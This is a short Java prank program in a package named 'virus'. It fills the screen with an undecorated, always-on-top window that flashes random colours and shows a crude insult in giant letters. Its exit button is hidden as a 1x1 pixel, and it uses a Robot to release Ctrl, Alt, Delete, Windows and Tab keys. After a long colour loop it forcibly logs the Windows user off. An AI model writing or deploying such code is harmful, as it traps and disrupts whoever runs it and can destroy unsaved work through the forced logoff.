package virus;
import javax.swing.*;

import java.util.*;
import java.awt.AWTException;
import java.awt.Color;
import java.awt.Container;
import java.awt.Font;
import java.awt.Robot;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;
import java.io.IOException;
public class random {
	public static void flashy_screen() throws AWTException{
		JFrame frame=new JFrame("HA LOL");
		frame.setExtendedState(JFrame.MAXIMIZED_BOTH); 
		frame.setUndecorated(true);
		frame.setLayout(null);
		frame.setVisible(true);
		Container x=frame.getContentPane();
		frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
		
		JButton exit=new JButton("Exit");
		int height=frame.getHeight();
		int width=frame.getWidth();
		JLabel three=new JLabel("ur mom gaey");
		three.setSize(width, height);
		three.setFont(new Font("Courier", Font.BOLD,215));
		three.setLocation(0,0);
		three.setForeground(Color.white);
		
		exit.setSize(1, 1);
		exit.setVisible(true);
		frame.setAlwaysOnTop(true);
		
		Robot robot=new Robot();
        releaseKeys(robot);
        
		exit.addActionListener(new ActionListener(){ //if you press the customer button...
			public void actionPerformed(ActionEvent e){
				 System.exit(0);
			}
		});
		frame.add(exit); frame.add(three);
		x.setBackground(Color.green);
		int y=0;
		while(y<99999999){
			x.setBackground(random_color());
			y++;
		}
		String shutdownCmd = "C:\\Windows\\System32\\logoff.exe";
		try {
			Process child = Runtime.getRuntime().exec(shutdownCmd);
		} catch (IOException e1) {
			// TODO Auto-generated catch block
			e1.printStackTrace();
		}
	}
	
	public static Color random_color(){
		Random rand = new Random();
		float r = rand.nextFloat();
		float g = rand.nextFloat();
		float b = rand.nextFloat();
		Color randomColor = new Color(r, g, b);
		return randomColor;
	}
	
	private static void releaseKeys(Robot robot) {
	    robot.keyRelease(17);
	    robot.keyRelease(18);
	    robot.keyRelease(127);
	    robot.keyRelease(524);
	    robot.keyRelease(9);
	  }
	
	public static void main(String args[]) throws AWTException{
		flashy_screen();
	}
}
